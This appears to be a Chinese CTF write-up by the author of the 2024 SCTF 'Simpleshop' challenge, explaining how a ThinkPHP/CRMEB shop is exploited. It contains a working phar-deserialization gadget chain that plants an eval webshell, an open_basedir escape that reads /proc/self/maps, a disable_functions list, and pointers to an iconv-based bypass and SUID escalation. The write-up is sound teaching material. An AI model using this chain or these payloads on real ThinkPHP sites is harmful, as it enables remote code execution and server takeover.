---
 title: 2024 SCTF Simpleshop WP
 date: 2024-10-7 12:00:00 +0800
 categories: [CTF,Thinkphp]
 tags: [CTF,SCTF,Thinkphp反序列化,代码审计]
---

其实这道题主要是想考一下在Thinkphp框架下在反序列化过程中如何实现任意文件写入以及cnext绕过disable_function实现命令执行

下载源码后进行简单的代码审计可以发现这套系统是显式路由模式在router自定义了路由实现,值得注意的是和常规的PATHINFO模式有点不太一样

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410011855023.png)



```
but I have disabled almost all the dangerous functions of php, and does some common php security restrictions
```

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410011900550.png)



这里letter暗示程序开启了较为严格的disabled_function和open_basedir安全限制,比较接近真实环境的php配置,所以常见的命令执行函数是可能失效的

这里在register.html提供了前台的用户注册接口 随便注册用户

非常明显的是 前台用户可以控制的就是头像上传点 但是做了一些后缀以及内容的安全限制

php版本 <8 而且是国内常用的thinkphp框架 自然会想到打phar反序列化

可以比较明显发现Sink点 在 app/common.php 可以触发反序列化

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410011914504.png)

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410011918536.png)



通过访问/api/image_base64 是会处理到`get_image_base64`函数当中的实现触发

紧接着是if判断 但是这里明显存在 逻辑上的问题 应该用`||` 连接 可以导致后缀的绕过 只要不为空即可绕过 判断

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020025100.png)

需要注意的是存在 `CacheService::remember` 的缓存机制

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020027257.png)

这意味着我们同一个图片只能够使用一次触发

在put_image中触发phar反序列化 `image_to_base64`可以触发任意文件读取/SSRF

这里我们主要关注phar反序列化的实现 跟进put_image中

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020033511.png)

发现对phar做了置空处理 双写/大小写绕过即可

链子部分由于我们禁用了大部分命令执行函数 优先考虑实现任意文件写

仔细观察 可以发现在安装程序时 public一定时可写的

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020037538.png)

那么写文件是可以实现的

这里讲下链子部分 认真学习了各位Web大手子的WP 每位师傅的思路都很清晰

出题时没有考虑到程序用到不是原生的thinkphp框架 导致可以实现guzzle任意文件写文件 简化了写文件的过程

https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/gadgets.php 

确实是我的疏忽 没有考虑到app本身有其他的扩展

其他大多数Web大哥的思路 都是通过反序列化链最终实现thinkphp模板渲染处实现任意代码执行触发到`eval` 实现 思路非常优秀 可以参考一下他们的解法

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410042308161.png)


这里提供一种当时想出来比较取巧的一种思路

一般来说 thinkphp框架最后sink点大致可以分为两类

一种是通过 __call方法实现跳板到`call_user_func_array` 实现rce或者接着当跳板实现其他目的

另外一种就是利用匿名类closure实现动态控制函数实现

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020106321.png)

我们可以通过控制 $closure($value, $this->data);实现我们的目的

网上的大师傅们一般都是在这个地方实现rce 比如`system`

但是实际上 `$value=this->data` 我们在获取`value`时走到第一个判断就返回`$this->data`的值了

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020121605.png)

相当于向`system`传入两个一摸一样的参数

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020111577.png)

意外的可以执行 原因在于 `system`接受一个可选参数作为返回值存储 比较巧合

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020112667.png)

这里明显可以控制两个参数 可以尝试用 `file_put_contents('/var/www/public/myshell','<?php eval($_POST[1]);?>')`

写入实现任意文件写 问题是我们分别如何控制每个参数的值了?

最后发现`$value`的值可以由`getData`获取

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020117870.png)

接着跟进`getRealFieldName`后 发现可以 存在`strict`属性

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020118272.png)

在三元表达式中可以令 `strict=false` 令严格模式为假

触发 Snake 驼峰命名转化机制 让key值实现不同

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020120713.png)

实现 进入判断2 返回`relation`中的值

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020122886.png)

从而实现单独控制每个参数的作用

```php
<?php  
  
  namespace think\model\concern;  
    
  trait Attribute  
  {     
      protected $strict = false;
      private $data = ["J1rry" => "<?php eval(\$_POST[1]);?>"];  
      private $withAttr = ["_j1rry" =>"file_put_contents"];  
      private $relation = ["_j1rry" => "/var/www/public/myshell.php"];  
  }  
    
  namespace think;  
    
  abstract class Model  
  {  
      use model\concern\Attribute;  
      private $lazySave;  
      protected $withEvent;  
      private $exists;  
      private $force;  
      protected $table;  
      function __construct($obj = '')  
      {  
          $this->lazySave = true;  
          $this->withEvent = false;  
          $this->exists = true;  
          $this->force = true;  
          $this->table = $obj;  
      }  
  }  
  namespace app\model\product\product;  
    
  use crmeb\traits\ModelTrait;  
  use think\Model;  
    
    
  class StoreProductCate extends Model  
  {  
  }  
    
  $a = new StoreProductCate();  
  $b = new StoreProductCate($a);  
  echo urlencode(serialize($b));  
  $phar = new \Phar('x.phar');  
  $phar->stopBuffering(); 
  $phar->setStub( 'GIF89a'.'<?php __HALT_COMPILER();?>');  
  $phar->addFromString('test.txt', 'J1rrY');  
  $phar->setMetadata($b);  
  $phar->stopBuffering();
```

最终实现了 `file_put_contents`的效果

gzip一下绕过明文检测 做明文混淆

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020136351.png)



![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020127049.png)

上传恶意phar文件的后

触发 phar反序列化

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020136438.png)

可以实现webshell文件的写入

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020137118.png)

这里disabled_function比较丧心病狂

```
system,exec, pcntl_exec, shell_exec, passthru, proc_get_status, checkdnsrr, getmxrr, getservbyname, getservbyport, syslog, popen, show_source, highlight_file, dl, socket_listen, socket_create, socket_bind, socket_accept, socket_connect, stream_socket_server, stream_socket_accept, stream_socket_client, ftp_connect, ftp_login, ftp_pasv, ftp_get, sys_getloadavg, disk_total_space, disk_free_space, posix_ctermid, posix_get_last_error, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix_getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_strerror, posix_times, posix_ttyname, posix_uname, assert, assert_options, proc_open, proc_close, proc_nice, proc_terminate, pcntl_fork, pcntl_signal, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, pcntl_signal_dispatch, pcntl_alarm, pcntl_get_last_error, pcntl_errno, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_wait, pcntl_getpriority, pcntl_setpriority, pcntl_async_signals, mb_send_mail, putenv, error_log,str_shuffle
```

我花了很长时间专门找了一个内核版本,glibc版本可以打通iconv的docker镜像

正常官方镜像是打不通的(hub太安全了不是)

直接打cnext就可以了

先读 `/proc/self/maps`找函数地址

```
mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));readfile('php://filter/convert.base64-encode/resource=/proc/self/maps');
```

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020146790.png)



![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020143816.png)

看到很多师傅都用 kezibei 师傅的本地化项目 实现一体化的绕过disabled_function 可以推荐一下

https://github.com/kezibei/php-filter-iconv/tree/main

后面就是简单的suid提权

`grep '' /flag`即可

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410020152924.png)

复现docker环境 https://github.com/J1rrY-learn/2024_SCTF_SimpleShop_docker

